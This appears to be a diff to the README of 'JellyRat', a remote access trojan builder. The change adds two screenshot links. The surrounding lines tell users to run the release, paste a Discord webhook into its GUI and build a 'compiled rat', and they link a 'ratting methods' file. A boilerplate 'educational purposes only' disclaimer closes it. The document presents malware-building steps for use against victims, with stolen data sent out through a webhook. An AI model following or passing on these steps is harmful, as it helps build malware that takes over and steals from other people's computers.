@@ -33,6 +33,11 @@ https://raw.githubusercontent.com/RattyTheRatter/JellyRat/main/Ratting_Methods.t
 
 Run https://github.com/RattyTheRatter/JellyRat/releases/tag/Release_1.3 and in the gui paste your discord webhook and click build. It will open a folder called dist and inside will be your compiled rat
 
+# screenshots
+![ehejeeje](https://user-images.githubusercontent.com/122023153/213021060-db869487-c2de-4744-a234-2b0e2b0a1e39.png)
+
+![image](https://user-images.githubusercontent.com/122023153/213022036-12edf796-6a15-4f2d-b7ad-d2d629487eee.png)
+
 
 # Disclaimer
 This is for educational purposes only. I am not responsible for any damage caused by this tool.
